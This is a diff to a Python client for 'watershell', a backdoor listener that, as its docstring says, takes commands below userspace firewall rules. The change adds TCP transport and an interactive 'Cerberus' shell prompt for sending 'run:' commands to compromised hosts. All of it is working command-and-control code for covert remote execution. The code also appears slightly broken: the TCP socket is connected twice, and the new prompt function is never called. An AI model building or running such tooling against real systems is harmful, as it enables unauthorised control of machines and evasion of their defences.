@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 
 """
-Watershell client; a script to easily send commands over UDP to hosts running
+Watershell client; a script to easily send commands over UDP or TCP to hosts running
 the watershell listening binary. The watershell will be listening for UDP data
 on a lower level of the network stack to bypass userspace firewall rules.
 """
@@ -46,14 +46,14 @@ def declare_args():
     Define command-line arguments for watershel-cli.py
     """
     parser = argparse.ArgumentParser(
-        description="Watershell client to send command to hosts with watershell listening over UDP.")
+        description="Watershell client to send commands to hosts with watershell listening over UDP/TCP.")
     
     parser.add_argument(
         '-t', '--target',
         dest='target',
         type=str,
         required=True,
-        help="Single IP target to send UDP message to (with -c option).")
+        help="Single IP target to send UDP/TCP message to (with -c option).")
     
     parser.add_argument(
         '-T', '--tcp',
@@ -67,7 +67,7 @@ def declare_args():
         dest='port',
         type=int,
         default=53,
-        help="Port to send UDP message to.")
+        help="Port to send UDP/TCP message to.")
     
     parser.add_argument(
         '-c', '--command',
@@ -92,17 +92,34 @@ def declare_args():
 
 def send_command_to_target(sock, target, command, tcp_bool):
     """
-    Send a command to a single target IP address.
+    Send a command to a single target IP address over UDP or TCP.
     """
     if tcp_bool:
         sock.connect(target)
-    
-    if not tcp_bool:
+        sock.send(("run:" + command).encode())
+    else:
         sock.sendto(("run:" + command).encode(), target)
         resp = recv_timeout(sock, 4)
         print(f"Response from {target}: {resp}")
-    else:
-        sock.send(("run:" + command).encode())
+
+def execute_cmd_prompt(sock, target, tcp_bool):
+    """
+    Interactively prompt user for commands and execute them
+    """
+    if tcp_bool:
+        sock.connect(target)
+
+    while True:
+        cmd = input("¯\_(ツ)_/¯Cerberus¯\_(ツ)_/¯->-> ")
+        if cmd.lower() == 'exit':
+            break
+        if len(cmd) > 1:
+            if not tcp_bool:
+                sock.sendto(("run:" + cmd).encode(), target)
+                resp = recv_timeout(sock, 4)
+                print(resp)
+            else:
+                sock.send(("run:" + cmd).encode())
 
 def main():
     """
@@ -111,12 +128,28 @@ def main():
     args = declare_args().parse_args()
 
     if args.interactive:
+        # Display ASCII art upon entering interactive mode
+        print(r"""
+                         /\_/\____,
+               ,___/\_/\ \  ~     /
+               \     ~  \ )   XXX
+                 XXX     /    /\_/\___,
+                    \o-o/-o-o/   ~    /
+                     ) /     \    XXX
+                    _|    / \ \_/
+                 ,-/   _  \_/   \
+                / (   /____,__|  )
+               (  |_ (    )  \) _|
+              _/ _)   \   \__/   (_
+             (,-(,(,(,/      \,),),
+        """)
+
         target = (args.target, args.port)
         s_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) if args.tcp_bool else socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s_socket.connect(target) if args.tcp_bool else s_socket.bind(("0.0.0.0", random.randint(40000, 65353)))
         
         while True:
-            cmd = input(f"Command for {args.target}:{args.port} (exit to quit): ")
+            cmd = input("¯\_(ツ)_/¯Cerberus¯\_(ツ)_/¯->-> ")
             if cmd.lower() == 'exit':
                 break
             send_command_to_target(s_socket, target, cmd, args.tcp_bool)
